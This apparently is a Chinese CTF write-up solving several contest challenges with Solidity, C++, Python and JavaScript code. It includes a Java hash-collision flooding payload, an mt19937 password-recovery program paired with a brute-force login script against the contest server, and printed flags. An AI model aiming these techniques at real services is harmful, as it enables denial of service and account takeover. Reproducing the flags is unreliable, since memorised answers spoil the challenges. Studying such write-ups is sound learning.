注意直接写 type(Dummy).creationCode 不行，编译出来的 creationCode  和原来编译的并不相同，必须编译+硬编码。

```solidity
pragma solidity =0.8.9;

// SPDX-License-Identifier: MIT

import "challenge1.sol";

contract MyPredictor is Predictor {
    function predict(address challenge) external returns (address) {
        return address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xff),
            challenge,
            Challenge(challenge).seed(),
            keccak256(abi.encodePacked(
                hex"608060405234801561001057600080fd5b5061017c806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c806319ff1d2114610030575b600080fd5b61003861004e565b6040516100459190610124565b60405180910390f35b60606040518060400160405280600681526020017f48656c6c6f210000000000000000000000000000000000000000000000000000815250905090565b600081519050919050565b600082825260208201905092915050565b60005b838110156100c55780820151818401526020810190506100aa565b838111156100d4576000848401525b50505050565b6000601f19601f8301169050919050565b60006100f68261008b565b6101008185610096565b93506101108185602086016100a7565b610119816100da565b840191505092915050565b6000602082019050818103600083015261013e81846100eb565b90509291505056fea2646970667358221220d65c19c2e3411473f3d909b5c1ceaa44b64961c56ca58c247accae052461048364736f6c63430008090033"
            ))
        )))));
    }
}
```

第二题首先想到私有变量可以被其他方式读到，比如创建一个storage合约，我们读到后调用这个合约，predictor则通过storage拿key。

然而一个no-discover的私链是怎么也访问不到的emmmm

然后想到直接调用 create_child， 发现一个地址上不能同时存在两个合约，没selfdestruct的合约一旦存在也没法销毁。

然后测试发现revert可以把创建合约给revert掉，读文档发现revert还能被catch、还能传递字符串出来。

所以 调用 create 后revert包含地址信息的字符串即可（渣码轻喷）。

```solidity
pragma solidity =0.8.9;

// SPDX-License-Identifier: MIT

import "challenge2.sol";

contract RealPred {
    function toAsciiString(address x) internal pure returns (string memory) {
        bytes memory s = new bytes(40);
        for (uint i = 0; i < 20; i++) {
            bytes1 b = bytes1(uint8(uint(uint160(x)) / (2**(8*(19 - i)))));
            bytes1 hi = bytes1(uint8(b) / 16);
            bytes1 lo = bytes1(uint8(b) - 16 * uint8(hi));
            s[2*i] = char(hi);
            s[2*i+1] = char(lo);            
        }
        return string(s);
    }

    function char(bytes1 b) internal pure returns (bytes1 c) {
        if (uint8(b) < 10) return bytes1(uint8(b) + 0x30);
        else return bytes1(uint8(b) + 0x57);
    }
    
    constructor(address ch, MyPredictor result) {
        address addr = Challenge(ch).create_child();
        revert(toAsciiString(addr));
    }
}

contract MyPredictor is Predictor {
    function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 0; i < 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }
    function predict(address challenge) external returns (address) {
        try new RealPred(challenge, this) {
            revert();
        } catch Error(string memory rr) {
            return parseAddr(rr);
        } catch {
            revert();
        }
        revert();
    }
}
```

## 助记词

印象中主流语言的hashmap是抗碰撞攻击的，然而看Java源码就是个BKDR hash？？？

第一题只要较少的延迟，因此直接提交一个字符串32次，32次equals的延迟即可。

第二题需要在linkedhashmap上留存很多同hash的字符串，使得尽可能多的触发equals。

注意到hash和当前秒数有关，因此实际需要几个hash*31后的结果连续的若干个值。

找碰撞的话内存不够。但是注意到 $600^4/2^{32}$ 大概是几十。

一方面意味着全部搜一遍也就几分钟（程序不是特别暴力的前提下）的事情，另一方面每个hash期望意义下都有几十个相同的解。

所以写个程序暴力枚举，枚举到hash*31处在`[magic,magic+20)`以内的才记下来。

```cpp
#include <bits/stdc++.h>
using namespace std;
char s[610][100];
using uint = unsigned int;
struct keys {
	uint key, pow;
	// bool used = false;
	// bool inkey = false;
	void init(char *str) {
		key = 0;
		pow = 1;
		for (; *str; str++) {
			key = key * 31 + uint(*str);
			pow *= 31;
		}
	}
} keys[610];
int magics[20];
int ans[20][100][4];
//int apool[100000][100][5];
int times[20] = {0};
long long cnter = 0;
int umatch = 19260817;
void dfs(int dep, int h, int now[4]) {
	if (dep == 4) {
		cnter++;
		if ((cnter & ((1 << 30) - 1)) == 0) printf("%lld\n", cnter);
		unsigned int v = h * 31;
		if (v > umatch + 20 || v < umatch) return;
		for (int i = 0; i < 20; i++) {
			if (h == magics[i]) {
				memcpy(ans[i][times[i]], now, sizeof(ans[i][times[i]]));
				times[i]++;
			}
		}
		// if (h == MAGIC) {
		// 	// ans[times][4] = 0;
		// 	for (int i = 0; i < 4; i++) {
		// 		ans[times][i] = now[i];
		// 		// if (keys[now[i]].inkey) ans[times][4] = 1;
		// 		// else keys[now[i]].inkey = true;
		// 	}
		// 	times++;
		// }
		return;
	}
	h = h * 31 + uint(' ');
	for (int i = 0; i < 600; i++) {
		now[dep] = i;
		dfs(dep + 1, h * keys[i].pow + keys[i].key, now);
	}
}
int main() {
	for (unsigned int i = 0; i != 0xffffffff; i++) {
		unsigned int v = i * 31;
		if (v >= umatch && v < umatch + 20) {
			magics[v - umatch] = i;
		}
	}
	for (int i = 0; i < 20; i++) {
		printf("M%d: %d -> %d\n", i, magics[i], magics[i] * 31);
	}
	FILE *f = fopen("mnemonics.txt", "r");
	int n = 0;
	while (~fscanf(f, "%s", s[n++]));
	while (!*s[n - 1]) n--;
	// assert(n == 605 - 5);
	fclose(f);
	for (int i = 0; i < 600; i++) keys[i].init(s[i]);
	// dfs(0, 0, now);
	int now[4] = {0, 0, 0, 0};
	for (int i = 0; i < 600; i ++) {
		now[0] = i;
		dfs(1, keys[i].key, now);
	}
	freopen("res.js", "w", stdout);
	puts("k = [];");
	for (int i = 0; i < 20; i++) {
		printf("// Id: %d\n", i);
		printf("// Magic Matchs: %d\n", times[i]);
		printf("// Magic Hash: %d\n", magics[i]);
		printf("k[%d] = [", i);
		for (int j = 0; j < times[i]; j++) {
			printf("\"%s %s %s %s\",", s[ans[i][j][0]], s[ans[i][j][1]], s[ans[i][j][2]], s[ans[i][j][3]]);
		}
		puts("]");
	}
}
```

然后就是每个估测碰撞数量来合理分配预期每秒放几个hash了。

估计的方法和 ICPC2020 WFI 的 M 题类似。但是注意到提交的第一秒存在随机，所以要多try几次。

```javascript
let p = 500, s = 0, pp = 0, ii = [];for (let i = 0; i <= 31;i++){
	s += i;
	if (s * 20 > p) {
		p += 1000;
		console.log(i);
		ii.push(k[10 - ii.length].slice(-(i - pp)));
		pp = i;
	}
}

fetch("/phrases?token=TOKEN", {
  "headers": {
    "accept": "*/*",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
    "content-type": "text/plain;charset=UTF-8"
  },
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify([].concat(...ii)),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

## Co-Program

### Co-Login

z3 求解来答题即可，注意对无符号数的处理（Z3PY默认的BitVec是有符号数），我这里通过改源码来解决问题（这不软件工程但快）。

```python
from pwn import *
from z3 import *

context(arch = 'amd64', os = 'linux') # , log_level = 'debug'

r = remote('202.38.93.111', 10700)
r.sendlineafter(b'token:', b'TOKEN') # your token
r.recvuntil(b'computer!\n')

"""
使用前修改 z3.py 中的 BitVecRef 中的部分重载（如下，将有符号改成无符号）：
直接IDE里点进去改
"""
class BBRef(BitVecRef):
    def __div__(self, other):
        a, b = _coerce_exprs(self, other)
        return BitVecRef(Z3_mk_bvudiv(self.ctx_ref(), a.as_ast(), b.as_ast()), self.ctx)

    def __truediv__(self, other):
        return self.__div__(other)

    def __rdiv__(self, other):
        a, b = _coerce_exprs(self, other)
        return BitVecRef(Z3_mk_bvudiv(self.ctx_ref(), b.as_ast(), a.as_ast()), self.ctx)

    def __rtruediv__(self, other):
        return self.__rdiv__(other)

    def __mod__(self, other):
        a, b = _coerce_exprs(self, other)
        return BitVecRef(Z3_mk_bvurem(self.ctx_ref(), a.as_ast(), b.as_ast()), self.ctx)

    def __rmod__(self, other):
        a, b = _coerce_exprs(self, other)
        return BitVecRef(Z3_mk_bvurem(self.ctx_ref(), b.as_ast(), a.as_ast()), self.ctx)

for i in range(100):
    expr = r.recvline().strip().decode('utf-8')
    result = int(r.recvline().strip().decode('utf-8'))
    print(expr, '=', result)
    loc = dict()
    nloc = dict()
    s = Solver()
    for i in 'qwertyuiopasdfghjklzxcvbnm':
        if i in expr:
            v = BitVec(i, 36)
            loc[i] = v
            nloc[i] = v
            s.add(s != 0)
    def funcwhat():
        # eval should be run here, and I don't know why!!!
        return eval(expr, loc)
    s.add(funcwhat() == result)
    if s.check() == sat:
        md = s.model()
        ans = []
        for k, v in nloc.items():
            aa = str(md.eval(v))
            if aa == k:
                aa = '8'
            ans.append(k + '=' + aa)
        print('ans:', ' '.join(ans))
        r.sendline(' '.join(ans).encode('utf-8'))
    else:
        r.sendline(b'')

r.interactive()
```

### Co-UnitTest

首先找长度限制是什么，发现没有长度限制？？？

（注意手动用命令行似乎有 4096 的限制，但是用 pwntools 没有）

首先我们可以把问题转成只有一对xy的情况。
也就是写

if(x=x[0],ans[0],if(...))

这里的9个常数用xy表示出来即可。我不会用相关工具，于是考虑构造。

问题：x y 如何构造 ans。

看起来很难？

问题：x 如何构造 ans。

看起来就容易得多！

首先 x-x=0,x/x=1。

有01就可以生万物了。

基于快速幂，众所周知

$1+1=2$

$2\times 2\times …\times 2=2^n$

而这里每个数都可以用不超过36个2的幂次的和表示。所以最后长度在可发送的范围以内。

构造起来非常的快。

至于70%正确率，30s答题时间是什么鬼？这不会是非预期解吧:)

flag里的cvc4又是什么玩意。（PS:我错了😭）

PS: 貌似还真是。

## 马赛克

首先猜测每个马赛克格子的灰度是其覆盖的原始每个像素的灰度的均值。

把不知道颜色的格子看作未知量，那么就可以写出m个等式。

考虑到均值最后/n这步是取整（也可能是四舍五入，但结果说明是取整）的，所以实际是2m个不等式。

用pulp求解线性规划即可。解出来不是个完全正确的二维码，但是再容错限度内，微信完全能扫。

```python
from PIL import Image
import numpy as np
import pulp

prob = pulp.LpProblem('const', pulp.LpMinimize)
prob += 0

im = Image.open("pixelated_qrcode.bmp")
print(im.size)
print(im.mode)
assert im.mode == 'L'
data = list(im.getdata())
data = np.array(data).reshape((627, 627))
print(data)
start = (103, 137)
end = (562, 596)
size = (627, 627)
pixel = (23, 23)
element = (11, 11)

def in_pix(x, y):
    return start[0] <= x <= end[0] and start[1] <= y <= end[1]

def new_matrix(x, y, value = None):
    return [[value] * y for _ in range(x)]

ul = 627 // 11
ori = new_matrix(ul, ul)
pixel = new_matrix(20, 20)

for i in range(627):
    for j in range(627):
        if in_pix(i, j):
            Y = ((i - start[0]) // 23, (j - start[1]) // 23)
            if Y[0] > 20 or Y[1] > 20:
                raise ('err', Y)
            if pixel[Y[0]][Y[1]] is None:
                pixel[Y[0]][Y[1]] = data[i][j]
            else:
                assert pixel[Y[0]][Y[1]] == data[i][j]
        else:
            X = (i // 11, j // 11)
            if 0 != data[i][j] != 255:
                print('err', i,j, data[i][j])
            if ori[X[0]][X[1]] is None:
                ori[X[0]][X[1]] = data[i][j]
            else:
                assert ori[X[0]][X[1]] == data[i][j]

for i in range(ul):
    for j in range(ul):
        if ori[i][j] is None:
            ori[i][j] = pulp.LpVariable("x_%d_%d" % (i, j), cat = pulp.LpBinary) * 255

est = new_matrix(20, 20, 0)
esc = new_matrix(20, 20, 0)

for i in range(627):
    for j in range(627):
        if in_pix(i, j):
            X = (i // 11, j // 11)
            Y = ((i - start[0]) // 23, (j - start[1]) // 23)
            est[Y[0]][Y[1]] = est[Y[0]][Y[1]] + ori[X[0]][X[1]]
            esc[Y[0]][Y[1]] += 1

pixel_size = 23 * 23
half = 23 * 23 - 1

for i in range(20):
    for j in range(20):
        assert esc[i][j] == pixel_size
        val = pixel[i][j]
        prob += est[i][j] >= val * pixel_size
        prob += est[i][j] <= val * pixel_size + half

print(sum(l.count(None) for l in ori))
print(sum(len(l) for l in ori))

prob.solve()
print(pulp.LpStatus[prob.status])

for i in range(627):
    for j in range(627):
        X = (i // 11, j // 11)
        if isinstance(ori[X[0]][X[1]], np.int32):
            data[i][j] = int(ori[X[0]][X[1]])
        else:
            data[i][j] = int(pulp.value(ori[X[0]][X[1]]))

new_im = Image.fromarray(np.uint8(data))
new_im.save("new_qrcode.bmp")
```

## minecRaft

（源码丢了，这是回忆版）

看源码，注意到 flag.js。

里面一些字符串常量手动调用 _0x22517d 还原下即可。

发现里面的校验就是 flag.encrypt(key)==ans。

这里的encrypt是可逆的（类似Feistel）。所以反着循环，解密即可。

## 密码生成器

用半天时间和IDA作为一只瞎猫碰到死老鼠（随机算法实现部分）。

可以看到前面有个循环等待一定的时间的函数，可patch掉。

然后逆向一下算法，里面的很复杂的运算看常数像是mt19937。然后用它的程序验证自己写的代码。

注意它发现密钥中含有的字符类型不足时会重新生成。

这是得到的代码。

```cpp
// [1632323460, 1632352260, 1632294660]
#include <random>
#include <iostream>
#include <cstring>
using namespace std;
const int length = 16;
const char alphabet[] ="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_+`-=[]\\{}|;':\",./<>?";
const float alphabetlen = float(strlen(alphabet));
typedef long long __time64_t;
int get_type(char x) {
    if (isupper(x)) return 0;
    if (islower(x)) return 1;
    if (isdigit(x)) return 2;
    return 3;
}
bool isOK(char result[17]) {
    int cnter[4] = {0};
    for (int i = 0; i < 16; i++) {
        cnter[get_type(result[i])]++;
    }
    return cnter[0] && cnter[1] && cnter[2] && cnter[3];
}
void gen(__time64_t seed) {
    mt19937 rnd(seed); // time(0)
	uniform_real_distribution<float> dis(0, 1);
    char result[17] {0};
    do {
        for (int i = 0; i < 16; i++) {
            float x = dis(rnd);
            float y = dis(rnd);
            int sel = int(x * y * alphabetlen);
            result[i] = alphabet[sel];
        }
    } while (!isOK(result));
    puts(result);
}
void genAll(__time64_t seed) {
    for (__time64_t i = seed - 30; i <= seed + 60; i++) {
        gen(i);
    }
}
int main() {
	genAll(1632323460);
	genAll(1632352260);
	genAll(1632294660);
    
}
```

在网页里打开用户信息页面(http://202.38.93.111:15002/profile/1)看到注册时间（注意不是发帖时间）。

往前倒退一段时间即可。

改时区不知所云，为了保险，加上+8h和-8h的。

然后暴力try

```js
const fetch = require('node-fetch');

async function run(pwd) {
    const body = await fetch("http://202.38.93.111:15002/login", {
    "headers": {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "upgrade-insecure-requests": "1",
        "Referer": "http://202.38.93.111:15002/login",
        "Referrer-Policy": "same-origin"
    },
    "body": "csrfmiddlewaretoken=TCOUjjAKWPMBfEGHbI6CBztDG7SFIgYC4Dv6fprPXIVCysB78ka3ixdk1dvJMfvi&username=admin&password=" + encodeURIComponent(pwd),
    "method": "POST"
    });
    const text = await body.text();
    return !text.includes('用户名或密码错误！');
}

const fs = require('fs');

async function dealAll() {
    const body = await fs.promises.readFile('res.txt', 'utf-8');
    const each = body.trim().split('\n').map(x => x.trim());
    for (let e of each) {
        console.log('testing', e);
        const isOK = await run(e);
        if (isOK) {
            console.log('bingo', e);
            break;
        }
    }
}

dealAll();

// flag{u5e_crypt0graph1ca1ly_secure_PRNG_plz_c090f3d063}
```

## 外星人的音游掌机

通过搜索找到 icestorm 作为逆向工具还原出 RTL 代码。

然后用找来的yosys简化一下：

```shell
read_verilog vlog.v
synth
flatten
opt
clean
opt_clean
write_verilog vlog.v
```

然后打开本科做玩具CPU的Vivado跑行为仿真。

里面有个功能可以生成模拟电路图，可以看几个btn的接线。

可以发现要求btn3=1,btn4=0;同时btn1要为1一会儿直到特定的时间窗口（一个4bit的数字每次clk上升沿如果btn1=1则+1，要求其值为特定值）。

btn2就比较怪，要求每次clk上升沿都改变一下，这大概就是ns级别的手速吧。

直接把结果变量写死（注意btn1和btn2的验证逻辑有重复的两处，都要改）。

然后仿真看到tx在变了，量了一下tx的时钟大概是clk的522倍。

那么每到这个522倍的时间都把tx的值记录下来。

以下是仿真文件：

```verilog
`timescale 1ns / 1ps

module xsim();

    reg clk, btn1, btn2, btn3, btn4;
    wire led, tx, n15, n218, n393;
    
    reg tmper = 0;
    
    reg rt = 0;

    chip CHIP (
        // Program ROM Pinouts
        .clk(clk),
        .btn1(btn1),
        .btn2(btn2),
        .btn3(btn3),
        .btn4(btn4),
        .led(led),
        .tx(tx)
    );

    initial begin
        #0      clk = 0;btn1=1;btn2=0;btn3=1;btn4 = 0;
        #26   btn1=0;
//        #75     btn1 = 1;
//        #100    btn1 = 0; btn4 = 1;
//        #100    btn4 = 0; btn3 = 1;
//        #100    btn3 = 0; btn2 = 1;
//        #100    btn2 = 0;
    end
    always #2 tmper = ~tmper;
    always @(posedge clk) btn2 = tmper;
    always #1 clk = ~clk;
    always #261 rt = ~rt;

integer dout_file;
initial begin
    dout_file = $fopen("E:\\result.txt");
    if(dout_file == 0)begin 
        $display("can not open the file!");
        $stop;
    end
end

always @(posedge rt) begin
    $fdisplay(dout_file, "%d", tx);
end

endmodule
```

百度复习UART的输出，结合实际输出发现每次0为起始信号，然后传8byte，没校验位（并且开头确实是flag）。

所以写个python恢复一下：

```python
v = [int(i.strip()) for i in open('result.txt', 'r').read().split('\n') if len(i)]

ans = ""

while len(v) > 0:
    if v[0] == 1:
        v = v[1:]
    else:
        #print(v[:10])
        v = v[1:]
        p = v[:8][::-1]
        v = v[8:]
        ans += chr(int(''.join([str(v) for v in p]), 2))

print(ans)
# flag{FpG4_has_F0Ss_t001cha1n_n0Wwwwww}
```

PS：还有 foss 工具？不会用emmm

## JUST BE FUN

看代码，大概是一个3维PC下的栈基虚拟机（有非常友好的交换栈内变量顺序的指令），要完成计算+ \* ^ | << \*\* 的功能。

手写个方便点的生成器写代码（PS: Github Copilot对于写重复性的代码太友好了）

大概在一行里用一堆if来确认运算符，然后每个运算符一列处理逻辑（主要逻辑在一层二维面上）。

循环结束的跳转就向上走一层，然后一直走到目标（目标一定能决定方向）“上空”再下来。

```plain
读取第一个数->判断是否为+->判断为*-...>check
			|			|					
			+运算逻辑    *运算逻辑
			跳回读取运算符处
```



注意到 ^ | 运算的右侧<10，所以只要硬编码几bit的判断即可，不需要在写循环了。

```cpp
#include <bits/stdc++.h>
using namespace std;

struct V3 {
    int x, y, z;
    V3(int x, int y, int z) : x(x), y(y), z(z) {}
    V3 operator + (const V3 &rhs) const {
        return V3(x + rhs.x, y + rhs.y, z + rhs.z);
    }
    V3 operator - (const V3 &rhs) const {
        return V3(x - rhs.x, y - rhs.y, z - rhs.z);
    }
    V3 &operator += (const V3 &rhs) {
        x += rhs.x; y += rhs.y; z += rhs.z;
        return *this;
    }
    string str() const {
        return "(" + to_string(x) + ", " + to_string(y) + ", " + to_string(z) + ")";
    }
};

struct Map {
    static const int len = 0x100;
    int map[len][len][len] = {{{0}}};
    void write(const V3 &pos, int chr) {
        if (pos.x < 0 || pos.x >= len || pos.y < 0 || pos.y >= len || pos.z < 0 || pos.z >= len) {
            fprintf(stderr, "out of bound at %s be %c\n", pos.str().c_str(), chr);
            return;
        }
        if (map[pos.x][pos.y][pos.z] == 0) {
            map[pos.x][pos.y][pos.z] = chr;
        } else {
            if (map[pos.x][pos.y][pos.z] != chr) {
                fprintf(stderr, "duplicate write at %s be %c\n", pos.str().c_str(), chr);
                fprintf(stderr, "pre value is %c\n", map[pos.x][pos.y][pos.z]);
            }
        }
    }
    void print() {
        for (int i = 0; i < len; i++) {
            for (int j = 0; j < len; j++) {
                for (int k = 0; k < len; k++) {
                    if (map[i][j][k]) {
                        printf("(%d, %d, %d) -> %d ", i, j, k, map[i][j][k]);
                    }
                }
            }
        }
        puts("END");
    }
} m;

struct StateCho;

struct State {
    V3 pos, rot;
    State(V3 pos, V3 rot) : pos(pos), rot(rot) {}
    void plus() {
        m.write(pos, '+');
        pos += rot;
    }
    void minus() {
        m.write(pos, '-');
        pos += rot;
    }
    void multiply() {
        m.write(pos, '*');
        pos += rot;
    }
    void divide() {
        m.write(pos, '/');
        pos += rot;
    }
    void modulo() {
        m.write(pos, '%');
        pos += rot;
    }
    void do_not() {
        m.write(pos, '!');
        pos += rot;
    }
    void gt() {
        m.write(pos, '`');
        pos += rot;
    }
    void pass(bool debug = false) {
        m.write(pos, debug ? '?' : ' '); // ? & is ok
        pos += rot;
    }
    void dup() {
        m.write(pos, ':');
        pos += rot;
    }
    void pop() {
        m.write(pos, '$');
        pos += rot;
    }
    void write() {
        m.write(pos, '.');
        pos += rot;
    }
    void writeChar() {
        m.write(pos, ',');
        pos += rot;
    }
    void readAsc() {
        m.write(pos, '~');
        pos += rot;
    }
    StateCho ifw1();
    StateCho ifw2();
    StateCho ifw3();
    void check() {
        m.write(pos, '@');
    }
    void push09(int v) {
        assert(v >= 0 && v <= 9);
        m.write(pos, '0' + v);
        pos += rot;
    }
    void stackSwap() {
        m.write(pos, '\\');
        pos += rot;
    }
    void stackSwap(int delta1, int delta2) {
        push09(delta1);
        push09(delta2);
        stackSwap();
    }
    void w2m() {
        m.write(pos, '^');
        rot = {0, -1, 0};
        pos += rot;
    }
    void w2a() {
        m.write(pos, 'v');
        rot = {0, 1, 0};
        pos += rot;
    }
    void w1m() {
        m.write(pos, '<');
        rot = {-1, 0, 0};
        pos += rot;
    }
    void w1a() {
        m.write(pos, '>');
        rot = {1, 0, 0};
        pos += rot;
    }
    void w3a() {
        m.write(pos, '[');
        rot = {0, 0, 1};
        pos += rot;
    }
    void w3m() {
        m.write(pos, ']');
        rot = {0, 0, -1};
        pos += rot;
    }
    void pushByte(int v) {
        assert(v != '"');
        m.write(pos, '"');
        pos += rot;
        m.write(pos, v);
        pos += rot;
        m.write(pos, '"');
        pos += rot;
    }
    void go(const State &dest) {
        // fprintf(stderr, "go from %s to %s\n", pos.str().c_str(), dest.pos.str().c_str());
        w1a();
        assert(pos.x == dest.pos.x + 1);
        while (pos.y > dest.pos.y) {
            w2m();
        }
        while (pos.y < dest.pos.y) {
            w2a();
        }
        while (pos.z > dest.pos.z) {
            w3m();
        }
        while (pos.z < dest.pos.z) {
            w3a();
        }
        w1m();
    }
    void go2(const State &dest) {
        // fprintf(stderr, "go2 from %s to %s\n", pos.str().c_str(), dest.pos.str().c_str());
        w1a();
        assert(pos.x == dest.pos.x + 1);
        while (pos.z > dest.pos.z) {
            w3m();
        }
        while (pos.z < dest.pos.z) {
            w3a();
        }
        while (pos.y > dest.pos.y) {
            w2m();
        }
        while (pos.y < dest.pos.y) {
            w2a();
        }
        w1m();
    }
};

struct StateCho {
    State lowSide;
    State trueSide;
    State highSide;
    State falseSide;
    void still(void (State::*v)()) {
        (lowSide.*v)();
        trueSide = lowSide;
        (highSide.*v)();
        falseSide = highSide;
    }
    StateCho(State lowSide, State highSide) :
        lowSide(lowSide), trueSide(lowSide), highSide(highSide), falseSide(highSide) {}
};

StateCho State::ifw1() {
    m.write(pos, '_');
    return StateCho(State(pos + V3{-1, 0, 0}, {-1, 0, 0}), State(pos + V3{1, 0, 0}, {1, 0, 0}));
}

StateCho State::ifw2() {
    m.write(pos, '|');
    return StateCho(State(pos + V3{0, -1, 0}, {0, -1, 0}), State(pos + V3{0, 1, 0}, {0, 1, 0}));
}

StateCho State::ifw3() {
    m.write(pos, '#');
    return StateCho(State(pos + V3{0, 0, -1}, {0, 0, -1}), State(pos + V3{0, 0, 1}, {0, 0, 1}));
}

int main() {
    State s{{0, 0, 0}, {1, 0, 0}};
    s.w1a();
    s.w3a();
    s.w2a();
    s.readAsc();
    s.pushByte('0');
    s.minus();
    State start = s;
    s.w2a();
    s.readAsc();
    s.dup();
    s.pushByte('+');
    s.minus();
    auto benrchPlus = s.ifw3();
    benrchPlus.still(&State::w2a);
    {
        auto s = benrchPlus.falseSide;
        s.w3a();
        s.pop();
        s.readAsc();
        s.pushByte('0');
        s.minus();

        s.plus();
        s.go(start);
    }
    s = benrchPlus.trueSide;
    s.w3a();
    s.w2a();
    s.dup();
    s.pushByte('*');
    s.minus();
    auto benrchMul = s.ifw3();
    benrchMul.still(&State::w2a);
    {
        auto s = benrchMul.falseSide;
        s.w3a();
        s.pop();
        s.readAsc();
        s.pushByte('0');
        s.minus();

        s.multiply();
        s.go(start);
    }
    s = benrchMul.trueSide;
    s.w3a();
    s.w2a();
    s.dup();
    s.pushByte('^');
    s.minus();
    auto benrchPow = s.ifw3();
    benrchPow.still(&State::w2a);
    {
        auto s = benrchPow.falseSide;
        s.w3a();
        s.pop();
        s.readAsc();
        s.pushByte('0');
        s.minus();
        
        s.push09(1); // ans -> pow -> ori
        s.stackSwap(1, 2); // pow -> ans -> ori
        State gg = s;
        s.w3a();
        s.dup();
        s.do_not();
        auto check0 = s.ifw2();
        check0.still(&State::w3a);
        {
            auto s = check0.trueSide;
            s.stackSwap(2, 3); // pow -> ori -> ans
            s.pop();
            s.pop();
            s.go(start);
        }
        s = check0.falseSide;
        s.stackSwap(1, 3); // ori -> ans -> pow
        s.dup(); // ori -> ori -> ans -> pow
        s.stackSwap(1, 3); // ans -> ori -> ori -> pow
        s.multiply(); // ans(new) -> ori -> pow
        s.stackSwap(1, 3); // pow -> ori -> ans
        s.push09(1);
        s.minus(); // pow(new) -> ori -> ans
        s.stackSwap(2, 3); // pow -> ans -> ori

        s.go2(gg);
    }
    s = benrchPow.trueSide;
    s.w3a();
    s.w2a();
    s.dup();
    s.pushByte('<');
    s.minus();
    auto benrchShift = s.ifw3();
    benrchShift.still(&State::w2a);
    {
        auto s = benrchShift.falseSide;
        s.w3a();
        s.pop();
        s.readAsc();
        s.pushByte('0');
        s.minus(); // times -> value
        
        State gg = s;
        s.w3a();
        s.dup();
        auto check0 = s.ifw2();
        check0.still(&State::w3a);
        {
            auto s = check0.falseSide;
            s.pop();
            for (int i = 0; i < 30; i++) s.pass(); // pass to avoid interection
            s.go(start);
        }
        s = check0.trueSide;
        s.stackSwap(1, 2); // value -> time
        s.push09(2);
        s.multiply();
        s.stackSwap(1, 2); // time -> value(new)
        s.push09(1);
        s.minus(); // time(new) -> value
        s.go2(gg);
    }
    s = benrchShift.trueSide;
    s.w3a();
    s.w2a();
    s.dup();
    s.pushByte('x');
    s.minus();
    auto benrchXor = s.ifw3();
    benrchXor.still(&State::w2a);
    {
        auto s = benrchXor.falseSide;
        s.w3a();
        s.pop();
        s.dup();
        s.pushByte(16);
        s.divide();
        s.pushByte(16);
        s.multiply();
        s.stackSwap(1, 2);
        s.pushByte(16);
        s.modulo();
        s.readAsc();
        s.pushByte('0');
        s.minus(); // y -> x % 16 -> y - y % 16
        for (int i = 1; i < 16; i *= 2) {
            s.dup(); // y -> y -> x
            s.stackSwap(1, 3); // x -> y -> y
            s.dup(); // x -> x -> y -> y
            s.stackSwap(2, 3); // x -> y -> x -> y
            s.push09(i);
            s.divide();
            s.push09(2);
            s.modulo();
            s.stackSwap(1, 2);
            s.push09(i);
            s.divide();
            s.push09(2);
            s.modulo();
            s.plus(); // xb + yb -> x -> y
            s.push09(2);
            s.minus();
            auto tcheck = s.ifw2();
            tcheck.still(&State::w3a);
            s = tcheck.falseSide;
            s.push09(i);
            s.minus();
            s.stackSwap(1, 2);
            s.push09(i);
            s.minus();
            s.w2a();
            State target = s;
            s.w3a();
            {
                auto s = tcheck.trueSide;
                s.go2(target);
            }
        }
        s.plus();
        s.plus();
        s.go(start);
    }
    s = benrchXor.trueSide;
    s.w3a();
    s.w2a();
    s.dup();
    s.pushByte('|');
    s.minus();
    auto benrchOr = s.ifw3();
    benrchOr.still(&State::w2a);
    {
        auto s = benrchOr.falseSide;
        s.w3a();
        s.pop();
        s.dup();
        s.pushByte(16);
        s.divide();
        s.pushByte(16);
        s.multiply();
        s.stackSwap(1, 2);
        s.pushByte(16);
        s.modulo();
        s.readAsc();
        s.pushByte('0');
        s.minus(); // y -> x % 16 -> y - y % 16
        for (int i = 1; i < 16; i *= 2) {
            s.dup(); // y -> y -> x
            s.stackSwap(1, 3); // x -> y -> y
            s.dup(); // x -> x -> y -> y
            s.stackSwap(2, 3); // x -> y -> x -> y
            s.push09(i);
            s.divide();
            s.push09(2);
            s.modulo();
            s.stackSwap(1, 2);
            s.push09(i);
            s.divide();
            s.push09(2);
            s.modulo();
            s.plus(); // xb + yb -> x -> y
            s.push09(2);
            s.minus();
            auto tcheck = s.ifw2();
            tcheck.still(&State::w3a);
            s = tcheck.falseSide;
            s.push09(i);
            s.minus();
            s.w2a();
            State target = s;
            s.w3a();
            {
                auto s = tcheck.trueSide;
                s.go2(target);
            }
        }
        s.pass(true);
        s.plus();
        s.plus();
        s.go(start);
    }
    s = benrchOr.trueSide;
    s.w3a();
    s.w2a();
    // x |
    // not check for 0
    s.pop(); // pop 0
    s.write();
    s.check();

    m.print();
    return 0;
}
```

PS: 感觉写的累死，不FUN。

调试可以魔改检查用的py。

提交发现超过了input的4096长度限制，用pwntools提交：

```cpp
from pwn import *

context(arch = 'amd64', os = 'linux') # , log_level = 'debug'

r = remote('202.38.93.111', 10104)
r.sendlineafter(b'token:', b'TOKEN') # your token

r.sendlineafter(b'>', open('cw.txt', 'rb').read())
r.interactive()
```

## fzuu

